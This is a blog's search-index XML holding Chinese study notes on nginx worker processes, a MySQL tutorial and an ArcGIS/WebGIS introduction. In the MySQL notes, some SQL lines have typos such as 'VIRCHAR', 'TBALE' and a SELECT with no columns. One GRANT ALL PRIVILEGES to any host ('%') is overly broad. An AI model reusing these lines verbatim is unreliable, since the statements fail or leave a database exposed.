做后台</li><li>用 Restful 应对复杂业务</li><li>ORM 不止能查库，还能查 ArcGIS Server 服务</li><li>来一套完整的用户模块</li><li>拒绝崩溃</li></ul></li><li><p>通过 JavaScript 看 ArcGIS 产品</p><ul><li>定制 ArcGIS Portal</li><li>Insights for ArcGIS</li><li>WebApp Builder</li><li>捷泰 Geocoding<br>  ……</li></ul></li><li><p>JavaScript 还能写原生应用</p><ul><li>React Native 版 Hello World</li><li>浏览个地图</li></ul></li><li><p>用 JavaScript 实现三维功能</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WebGIS </category>
          
          <category> 教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx-笔记</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/nginx-%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/nginx-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/xxcupid/article/details/52495172">参考网址</a></p><h2 id="Mater-与-Worker"><a href="#Mater-与-Worker" class="headerlink" title="Mater 与 Worker"></a>Mater 与 Worker</h2><h3 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h3><p>master进程主要用来<strong>管理worker</strong>进程，包含：接收来自外界的信号，向各worker进程发送信号，监控worker进程的运行状态，当worker进程退出后(异常情况下)，会自动重新启动新的worker进程。</p><span id="more"></span><h3 id="Worker"><a href="#Worker" class="headerlink" title="Worker"></a>Worker</h3><p>基本的<strong>网络事件</strong>，则是放在worker进程中来处理了。多个worker进程之间是对等的，他们同等竞争来自客户端的请求，各进程互相之间是<strong>独立</strong>的。一个请求，只可能在一个worker进程中处理，一个worker进程，不可能处理其它进程的请求。worker进程的个数是可以设置的，一般我们会设置与机器cpu核数一致。</p><h3 id="worker进程如何处理请求？"><a href="#worker进程如何处理请求？" class="headerlink" title="worker进程如何处理请求？"></a>worker进程如何处理请求？</h3><p>&emsp;&emsp;worker进程之间是平等的，每个进程，处理请求的机会也是一样的。当我们提供80端口的http服务时，<strong>一个连接请</strong>求过来，每个进程都有可能处理这个连接，怎么做到的呢？首先，每个worker进程都是从master进程fork过来，在master进程里面，先建立好需要listen的socket（listenfd）之后，然后再fork出多个worker进程。<strong>所有worker进程</strong>的listenfd会<strong>在新连接到来时变得可读</strong>，为保证只有一个进程处理该连接，所有worker进程在<strong>注册listenfd读事件前抢accept_mutex</strong>，抢到互斥锁的那个进程<strong>注册listenfd读事件</strong>，在读事件里<strong>调用accept接受该连接</strong>。当一个worker进程在accept这个连接之后，就开始读取请求，解析请求，处理请求，产生数据后，再返回给客户端，最后才断开连接，这样一个完整的请求就是这样的了。我们可以看到，一个请求，完全由worker进程来处理，而且只在一个worker进程中处理。</p><h3 id="如何处理事件"><a href="#如何处理事件" class="headerlink" title="如何处理事件?"></a>如何处理事件?</h3><p>多个worker进程，异步非阻塞方式处理请求。<br><br>三种事件类型：网络事件、信号、定时器。<br><br>在处理网络事件的回调函数时，通常做的第一个事情就是判断超时，然后再去处理网络事件。</p>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql - 教程笔记</title>
      <link href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql%E7%AC%94%E8%AE%B0/mysql-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql%E7%AC%94%E8%AE%B0/mysql-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h3><p>原则：</p><ol><li>不可重复（唯一）</li><li>最好不要修改</li><li>和业务不相关<br>常见主键：</li><li>自增整数类型（整数）（INT自增最多21亿）（BIGINT）</li><li>全局唯一GUID类型（字符串。GUID算法）</li><li>联合主键（多个字段一起设置为主键，只要不是所有主键重复即可）<span id="more"></span><h3 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h3>与其他表格关联起来的字段，称为<strong>外键</strong>。</li></ol><ul><li>添加外键  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_class_id  # <span class="keyword">CONSTRAINT</span> 定义一个 外键约束的名称</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (class_id)   # 指定外键</span><br><span class="line"><span class="keyword">REFERENCES</span> classes (id);  # 关联其他表</span><br></pre></td></tr></table></figure></li><li>删除外键约束(并没有删除<strong>外键列</strong>)  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY fk_class_id;</span><br></pre></td></tr></table></figure>外键约束会降低性能。所以有的时候为了提高性能，只是添加一个作为外键的列，却没有外键约束。<br></li><li>一对多关系：</li><li>多对多关系：通过两个一对多关系（一个中间表）实现。</li><li>一对一关系：一个表的记录对应到另一个表的唯一一个记录。（把一个大表拆分为两个一对一的表，为了把<strong>经常读取</strong>和<strong>不经常读取</strong>的字段分开）</li></ul><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>经常根据某一列进行查询，就可以对列创建索引。加快查询速度</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 添加索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">INDEX</span> idx_score (score);  # 也可以多列 idx_score (<span class="type">name</span>, score);</span><br></pre></td></tr></table></figure><ul><li>作为索引列，每条记录的值越不相同，索引效率越高。</li><li>索引越多，插入、更新和删除记录的速度就越慢。（虽然提高了查询效率，缺点是在插入、更新和删除记录时，需要同时修改索引）</li><li>会自动对其创建主键索引</li><li><strong>唯一索引</strong>：一些根据业务要求，需要具有唯一性约束的列（例如身份证）  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 添加唯一索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> uni_name  (<span class="type">name</span>);</span><br><span class="line"></span><br><span class="line"># <span class="keyword">or</span> 添加带有唯一约束的索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uni_name <span class="keyword">UNIQUE</span> (<span class="type">name</span>);</span><br></pre></td></tr></table></figure><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="基本查询，条件查询，投影查询，分页查询，聚合查询，多表查询，连接查询。"><a href="#基本查询，条件查询，投影查询，分页查询，聚合查询，多表查询，连接查询。" class="headerlink" title="基本查询，条件查询，投影查询，分页查询，聚合查询，多表查询，连接查询。"></a>基本查询，条件查询，投影查询，分页查询，聚合查询，多表查询，连接查询。</h4></li><li>in, like, between(5,10) 包含 <br></li><li>起别名（返回的列名改变） <br></li><li>排序：order by <col1> [DESC/ASC], <col2>  <br></li><li>分页：LIMIT <M> OFFSET <N>  (offset默认为0，第五页，那 N=M*(5-1))  <br></li><li>count(): select count(*) from students; <strong>没匹配到会返回0</strong> <br></li><li>SUM、AVG、MAX、MIN 一般记录是数值型的。 <strong>没匹配到返回 NULL</strong> <br></li><li>多表查询：列数之和，行数之积；注意字段名可能重合，最好使用别名。 <br>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    students.<span class="built_in">id</span> sid,</span><br><span class="line">    students.<span class="built_in">name</span>,</span><br><span class="line">    students.gender,</span><br><span class="line">    students.score,</span><br><span class="line">    classes.<span class="built_in">id</span> cid,</span><br><span class="line">    classes.<span class="built_in">name</span> cname</span><br><span class="line">FROM students, classes;  <span class="comment"># 还可以给表设置别名</span></span><br></pre></td></tr></table></figure></li><li>连接查询：主表、需要连接的表、连接条件、（where 、order by）<ul><li>内连接(inner join 两个字段相等，交集)<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.id, s.name, s.class_id, c.name class_name, s.gender, s.score</span><br><span class="line"><span class="keyword">FROM</span> students s</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> classes c</span><br><span class="line"><span class="keyword">ON</span> s.class_id = c.id;</span><br></pre></td></tr></table></figure></li><li>外连接 (不存在的字段用 NULL)<ul><li>LEFT OUTER JOIN </li><li>RIGHT OUTER JOIN</li></ul></li></ul></li></ul><h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><ul><li>增加：<code>INSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...),(第二条记录),...;</code> 有默认值的字段可以不出现</li><li>更新：<code>UPDATE &lt;表名&gt; SET 字段1=值1,字段2=值2,... WHERE ...</code>；更新字段可以使用表达式；没有匹配到结果也不会报错；最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用UPDATE更新。（就是自己先看下查的是不是要改的数据）</li><li>删除：<code>DELETE FROM &lt;表名&gt; WHERE ...;</code>也是没匹配到也不会报错，也是最好先SELECT</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>MySql Client 是为了连接 mysql(server端)，所以只下载 Client ，连接远程mysql <code>mysql -h 10.0.1.99 -u root -p</code></li><li>MySQL Workbench: 管理 MySQL 的可视化图形界面。（其实和MySQL Client 是一个作用，只是有界面）</li><li>命令行程序mysql实际上是MySQL客户端，真正的MySQL服务器程序是mysqld，在后台运行。</li><li>端口 3306</li><li>字段应该避免允许 NULL（简化查询条件，加快查询速度）</li><li>数据库<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 数据库</span><br><span class="line"><span class="keyword">SHOW</span> DATABASE;  # 列出所有数据库</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE test; # 创建</span><br><span class="line"><span class="keyword">DROP</span> DATABASE test;  # 删除</span><br><span class="line">USE test;   # 切换</span><br><span class="line"></span><br><span class="line"># 表</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;  # 查看当前数据库的所有表</span><br><span class="line"><span class="keyword">DESC</span> test;   # 查看表的结构</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test;  # 查看创建表的<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> test;  # 删除表</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> birth VIRCHAR(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>; # 表格新增列</span><br><span class="line"><span class="keyword">ALTER</span> TBALE test CHANGE <span class="keyword">COLUMN</span> birth birthday VIRCHAR(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>;  # 修改列名</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> birthday; # 删除列</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQL-语句"><a href="#SQL-语句" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><ul><li>有则替换，无则添加（与<strong>更新</strong>相比，原纪录被删除，新增一条纪录）<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE <span class="keyword">INTO</span> test (id, class_id, <span class="type">name</span>, gender, score) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">99</span>);</span><br></pre></td></tr></table></figure></li><li>有则更新，无则添加<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test (id, class_id, <span class="type">name</span>, gender, score) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">99</span>) <span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> <span class="type">name</span>=<span class="string">&#x27;小明&#x27;</span>, gender=<span class="string">&#x27;F&#x27;</span>, score=<span class="number">99</span>;</span><br></pre></td></tr></table></figure></li><li>有则忽略，无则添加<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">IGNORE</span> <span class="keyword">INTO</span> test (id, class_id, name, gender, score) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">99</span>)</span><br></pre></td></tr></table></figure></li><li>快照（复制当前表 test 到新表 test_of_1）<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_of_1 <span class="keyword">SELECT</span> <span class="keyword">FROM</span> test <span class="keyword">where</span> clas_id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li>写入结果集（查询结果写入表中，可以创建新表(CREATE)，或者 将结果插入到指定表（INSERT））<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 创建新表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> statistics (</span><br><span class="line">  id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  class_id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  average <span class="keyword">DOUBLE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY(id)</span><br><span class="line">);</span><br><span class="line"># 添加查询结果</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> statistics (class_id, average) <span class="keyword">SELECT</span> class_id, <span class="built_in">AVG</span>(score) <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id; </span><br></pre></td></tr></table></figure></li></ul><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>一系列操作必须全部执行，若失败，则撤销。这种把多条语句作为一个整体进行操作的功能，被称为<strong>数据库事务</strong>。</p><h4 id="特性-ACID"><a href="#特性-ACID" class="headerlink" title="特性 ACID"></a>特性 ACID</h4><ul><li><strong>Atomic</strong>: 原子性，将所有SQL作为原子工作单元执行，要么全部执行，要么全部不执行；</li><li><strong>Consistent</strong>：一致性，事务完成后，所有数据的状态都是一致的，即A账户只要减去了100，B账户则必定加上了100；</li><li><strong>Isolation</strong>：隔离性，如果有多个事务并发执行，每个事务作出的修改必须与其他事务隔离；</li><li><strong>Duration</strong>：持久性，即事务完成后，对数据库数据的修改被持久化存储。</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul><li>隐式事务：自动将<strong>单条SQL语句</strong>作为一个事务执行，这种事务被称为隐式事务；</li><li>显式事务：要手动把多条SQL语句作为一个事务执行，使用BEGIN开启一个事务，使用COMMIT提交一个事务，这种事务被称为显式事务。<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance = balance - <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance = balance + <span class="number">100</span> <span class="keyword">WHERE</span> id = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">COMMIT</span>;  # ROLLABCK =&gt; 如果希望主动让事务失败，可以不提交，直接回滚事务</span><br></pre></td></tr></table></figure></li></ul><h4 id="隔离级别（并发执行事务时需要设定）"><a href="#隔离级别（并发执行事务时需要设定）" class="headerlink" title="隔离级别（并发执行事务时需要设定）"></a>隔离级别（并发执行事务时需要设定）</h4><table><thead><tr><th>Isolation</th><th>Level</th><th>脏读（Dirty Read）</th><th>不可重复读（Non Repeatable Read）</th><th>幻读（Phantom Read）</th></tr></thead><tbody><tr><td>Read</td><td>Uncommitted</td><td>Yes</td><td>Yes</td><td>Yes</td></tr><tr><td>Read</td><td>Committed</td><td>-</td><td>Yes</td><td>Yes</td></tr><tr><td>Repeatable</td><td>Read</td><td>-</td><td>-</td><td>Yes</td></tr><tr><td>Serializable</td><td>-</td><td>-</td><td>-</td><td></td></tr></tbody></table><hr><ul><li>Read Uncommitted （脏读 = 读取 未提交的）<ul><li>隔离级别最低的一种事务级别。在这种隔离级别下，一个事务会读到另一个事务<strong>更新后但未提交</strong>的数据，如果另一个事务回滚，那么当前事务读到的数据就是脏数据，这就是脏读（Dirty Read）。</li></ul></li><li>Read Committed （不可重复读）(UPDATE 操作)<ul><li>在Read Committed隔离级别下，一个事务可能会遇到不可重复读（Non Repeatable Read）的问题</li><li>不可重复读是指，在一个事务内，多次读同一数据，在这个事务还没有结束时，如果另一个事务恰好修改了这个数据，那么，在第一个事务中，两次读取的数据就可能不一致。(<strong>就是没提交就读不到</strong>)</li></ul></li><li>Repeatable Read （默认级别，幻读）(INSERT INTO 操作)<ul><li>事务B在第3步第一次读取id=99的记录时，读到的记录为空，说明不存在id=99的记录。随后，事务A在第4步插入了一条id=99的记录并提交。事务B在第6步再次读取id=99的记录时，读到的记录仍然为空，但是，事务B在第7步试图更新这条不存在的记录时，竟然成功了，并且，事务B在第8步再次读取id=99的记录时，记录出现了。<br></li><li>(A插入后未提交，B 在当前隔离级别，update 会卡在那。</li><li>A Insert 后提交，B不能查到A刚insert的，需要update那条记录后，才能查到</li><li>如果是默认的，B 不用update 也能直接查到，所以 还是和 Reaptable Read <strong>有区别</strong>？（InnoDB）</li></ul></li><li>Serializable<br><ul><li>最严格的级别，脏读、不可重复度、幻读 都不会存在。<br></li><li>如果没有指定隔离级别，数据库就会使用默认的隔离级别。在MySQL中，如果使用InnoDB，默认的隔离级别是Repeatable Read。</li></ul></li></ul><p>命令的颗粒度(隔离)：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脏读</span></span><br><span class="line"><span class="comment"># B 会立马获取 A 语句执行结果</span></span><br><span class="line">A: <span class="keyword">begin </span>=&gt; SQL1,SQL2      <span class="keyword">B:begin </span>=&gt; SQL1,SQL2    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 不可重复读</span></span><br><span class="line"><span class="comment"># A 更改记录后，一提交，B 就获取到了，虽然 B 还没执行完命令，</span></span><br><span class="line"><span class="comment"># 所以可能 B 两次获取的数据不一样（在 A 提交数据前后）</span></span><br><span class="line">A: <span class="keyword">begin </span>=&gt; [SQL1,SQL2] =&gt; commit     <span class="keyword">B:begin </span>=&gt; SQL2,SQL2  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 幻读</span></span><br><span class="line"><span class="comment"># A 更改记录并提交，B 不能立马获取到。但是，如果 A 进行 Insert(添加) 操作提交后，</span></span><br><span class="line"><span class="comment"># B 不能查看到那条记录，却可以对那条记录进行更新，并且更新后可以查看到那条记录</span></span><br><span class="line">A: <span class="keyword">begin </span>=&gt; [SQL1,SQL2] =&gt; commit     <span class="keyword">B:begin </span>=&gt; <span class="string">&#x27;SQL2,SQL2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Serializable 杜绝了那些行为的影响，但由于事务是串行执行，所以效率会大大下降</span></span><br><span class="line">A: <span class="keyword">begin </span>=&gt; [SQL1,SQL2] =&gt; commit     <span class="keyword">B:begin </span>=&gt; [SQL2,SQL2]</span><br></pre></td></tr></table></figure><h2 id="参考网址-lt-——"><a href="#参考网址-lt-——" class="headerlink" title="参考网址&lt;——-"></a><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611020917408">参考网址&lt;——-</a></h2><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><p>例如，你想myuser使用mypassword从任何主机连接到mysql服务器的话。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;myuser&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;mypassword&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">FLUSH   <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure><p>如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器，并使用mypassword作为密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;myuser&#x27;</span>@<span class="string">&#x27;192.168.1.3&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;mypassword&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">FLUSH   <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure><p>如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器的dk数据库，并使用mypassword作为密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> dk.* <span class="keyword">TO</span> <span class="string">&#x27;myuser&#x27;</span>@<span class="string">&#x27;192.168.1.3&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;mypassword&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">FLUSH   <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/kevin_cat/article/details/86419000">mysql远程连接-参考</a></p><p>服务器控制台 入站规则 打开mysql端口3306</p><h3 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h3><ol><li><code>my.cnf =&gt; [mysqld] =&gt; skip-grant-tables</code></li><li><code>systemctl restart mysqld.service</code></li><li><code>mysql -u root -p</code> 无密码登录</li><li><code>use mysql</code></li><li><code>update user set password=password(&#39;****&#39;) where user=&#39;root&#39;</code></li><li><code>flush privileges;</code></li><li>重启 mysql</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> mysql笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> mysql </tag>
            
            <tag> 廖雪峰 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webgis介绍</title>
      <link href="/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/webgis%E4%BB%8B%E7%BB%8D/"/>
      <url>/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/webgis%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p><a href="http://zhihu.esrichina.com.cn/?/article/539">参考</a> <br></p><h3 id="一：Web-GIS-入门"><a href="#一：Web-GIS-入门" class="headerlink" title="一：Web GIS 入门"></a>一：Web GIS 入门</h3><h4 id="什么是"><a href="#什么是" class="headerlink" title="什么是?"></a>什么是?</h4><p>gis database server| gis server =&gt; webserver | client <br><br>核心在于gis服务器（安装 ArcGIS for Server 软件的服务器)</p><h4 id="服务与聚合"><a href="#服务与聚合" class="headerlink" title="服务与聚合"></a>服务与聚合</h4><ul><li>Web GIS<strong>服务</strong>顾名思义，提供了具有GIS功能的Web服务，最常见的有地图服务、要素服务、地理处理服务等等</li><li><strong>聚合</strong>是通过动态的组合多个网站的资源或服务，来创建新的Web应用的方法。</li></ul><span id="more"></span><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li><strong>Web GIS应用 = 基础底图 + 操作图层 + 任务</strong><ul><li>基础<strong>底图</strong>是指不会频繁改变的地图</li><li>操作图层是指用户常用来<strong>查询</strong>、<strong>编辑</strong>的<strong>主题</strong>图层</li><li>任务是指如导航、地址编码等计算量比较大的<strong>分析</strong>任务</li></ul></li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><h3 id="二：认识ArcGIS-for-Server"><a href="#二：认识ArcGIS-for-Server" class="headerlink" title="二：认识ArcGIS for Server"></a>二：认识ArcGIS for Server</h3><h4 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h4><p>安装了ArcGIS for Server软件的服务器可以作为GIS服务器了；具有了若干处理GIS问题的能力（比如绘制地图、空间分析、查找路径等等）</p><h4 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h4><p>最主要的功能可以分为<strong>发布服务</strong>与<strong>管理服务</strong>两部分。</p><ul><li>发布服务<ul><li>发布本地已有的GIS资源：地图、数据、地理处理工具等</li><li>自带的服务：创建缓存、几何计算、打印输出等</li></ul></li><li>管理服务<ul><li>ArcGIS Server Manager （使用频率最高）<ul><li>对数据进行添加与移除、调整与组织</li><li>配置服务器：增加或删除提供服务的<strong>机器</strong>、管理服务器可以访问到的<strong>数据源</strong>、使用日志对 GIS 服务器进行<strong>故障排除</strong>。</li></ul></li><li>Services Directory (服务目录)<ul><li>查看用来调用每个服务应该使用的url</li><li>查看关于服务的元数据信息（服务的发布者、服务中的图层、使用的空间参考、支持的操作）</li></ul></li><li>Administrator API (少量的管理操作)<ul><li>删除一个服务，修改服务器名称</li><li>大量的管理炫飞，需要编写脚本来完成</li></ul></li></ul></li></ul><h4 id="支持的服务类型"><a href="#支持的服务类型" class="headerlink" title="支持的服务类型"></a>支持的服务类型</h4><p>最常用的包括地图服务、要素服务、影像服务、地理处理服务、Globe服务等。</p><ul><li>Map Service(地图服务)<ul><li>地图服务将由一个或多个图层组成的<strong>地图转换为</strong>一幅幅<strong>图片</strong>，当<strong>客户端</strong>向server<strong>发出请求</strong>，要求查看某个范围内的地图时，地图服务就会把该<strong>范围内的图片返回</strong>给客户端。</li><li>图片可以是动态生成，也可以是提前生成的瓦片（经过缓存的地图服务）。</li><li>地图服务一般可以支持查询、投影等操作</li><li>三维的地图服务也就是Globe服务，可以立体的展示出地图上的某些属性，比如楼房的高度、山丘的起伏等。</li></ul></li><li>Feature Service(要素服务)<ul><li>增加地图编辑、修改的服务</li></ul></li><li>Image 